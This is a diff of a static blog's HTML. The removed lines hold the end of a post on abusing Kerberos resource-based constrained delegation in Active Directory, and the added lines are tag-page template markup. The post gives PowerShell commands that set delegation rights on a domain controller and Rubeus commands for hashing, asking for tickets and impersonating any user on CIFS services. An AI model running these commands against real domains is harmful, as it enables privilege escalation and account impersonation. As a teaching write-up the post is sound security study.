-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;&lt;YOURSID&gt;)&quot;</span>;<span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength);<span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>); <span class="built_in">Get-DomainComputer</span> dc | <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p>The sddl string is no magic.<br>Following <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/archive/blogs/askds/the-security-descriptor-definition-language-of-love-part-2">https://docs.microsoft.com/en-us/archive/blogs/askds/the-security-descriptor-definition-language-of-love-part-2</a> and <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format">https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format</a>, we see that it means:<br>Set the Owner as Builtin Administrators (O:BA), which is by default.<br>Set a DACL with no flags(D:)<br>The DACL shall contain one ACE:<br>The ACE permits to do a bunch of things (CCDCLCSWRPWPDTLOCRSDRCWDWO) such as read, delete and a bunch more<br>This allows us to access any service (e.g cifs) on <code>dc</code>)<br>The ACE applies to fake1’s SID, so fake1 can perform these things.</p>
-<p>After applying, we check if it’s in place:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$RBCDbytes</span> = <span class="built_in">Get-DomainComputer</span> dc <span class="literal">-Properties</span> <span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span> | <span class="built_in">select</span> <span class="literal">-expand</span> msds<span class="literal">-allowedtoactonbehalfofotheridentity</span> ; <span class="variable">$Descriptor</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="variable">$RBCDbytes</span>, <span class="number">0</span> ; <span class="variable">$Descriptor</span>.DiscretionaryAcl</span><br></pre></td></tr></table></figure>
-
-<p>If we do have access to the ActiveDirectory module:<br>Use Set-ADComputer to allow fake1 to access resources of dc:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADComputer</span> dc <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> (<span class="built_in">Get-ADComputer</span> fake1)</span><br></pre></td></tr></table></figure>
-<p>If there was already delegation rule set, do</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADComputer</span> dc <span class="literal">-PrincipalsAllowedToDelegateToAccount</span> (<span class="built_in">Get-ADComputer</span> &lt;original account&gt;),(<span class="built_in">Get-ADComputer</span> fake1)</span><br></pre></td></tr></table></figure>
-
-<p>Then <code>Get-ADComputer dc -Properties</code> to confirm write.</p>
-<p>Now we need to calculate the AES hash of our created computer account(since we know the password).</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe hash /password:Password123! /user:fake1<span class="variable">$</span> /domain:secure.local</span><br></pre></td></tr></table></figure>
-
-<p>If this fails for whatever reason, only provide <code>/password</code> field and use the returned rc4_hmac(ntlm) hash to asktgt.</p>
-<p>If we used an account we compromised, we should have the AES hash already(hopefully).</p>
-<p>With the hash, we can now request TGT and do the rubeus s4u command just like traditional constrained delegation.</p>
-<h3 id="Exploit-mimic-protocol-transition"><a href="#Exploit-mimic-protocol-transition" class="headerlink" title="Exploit mimic protocol transition"></a>Exploit mimic protocol transition</h3><p>If <code>dc</code> has a traditional constrained delegation to <code>cifs\dc2.secure.local</code> that is <strong>kerberos only</strong>, we can still exploit it to impersonate any users for that service, just like if any authentication method is allowed.</p>
-<p>Overview:</p>
-<p>Follow the steps above to craft a forwadable ticket for any user, on the computer <code>dc</code>.</p>
-<p>Since <code>dc</code> has constrained delegation to <code>cifs\dc2.secure.local</code>, and we already have a forwadable ticket, we can directly use <code>S4U2Proxy</code>.</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /ticket:&lt;base64kirbi&gt; /msdsspn:<span class="string">&quot;cifs/dc2.secure.local&quot;</span> /tgs:&lt;TGS from previous step&gt; /altservice:cifs /nowrap</span><br></pre></td></tr></table></figure>
-
-<p>Where <code>/ticket</code> is the TGT returned from step 1, after we provided AES hash of created account, and <code>/tgs</code> is the forwadable ticket returned from step 1.</p>
-<p>The result should be a ticket where we can impersonate any desired user on <code>cifs\dc2.secure.local</code>.</p>
-<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Some real fun stuff, and are considered state of the art techniques about 4 years ago.</p>
-<p>Check my references below for the amazing efforts done by these researchers.</p>
-<p>I truly feel like “Standing on the shoulders of giants”.</p>
-<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://www.mandiant.com/resources/kerberos-tickets-on-linux-red-teams">https://www.mandiant.com/resources/kerberos-tickets-on-linux-red-teams</a></li>
-<li><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></li>
-<li><a target="_blank" rel="noopener" href="https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a">https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/">https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/</a></li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">windows</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">fuzzing</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">activedirectory</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">reads</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/07/28/kerberos-delegations/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2022/09/03/cve-2021-31956/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          CVE-2021-31956 exploit and analysis
-        
-      </div>
-    </a>
   
   
-    <a href="/2022/05/06/exploit-inherited-handles/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Exploiting Inherited Handles</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -534,9 +222,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
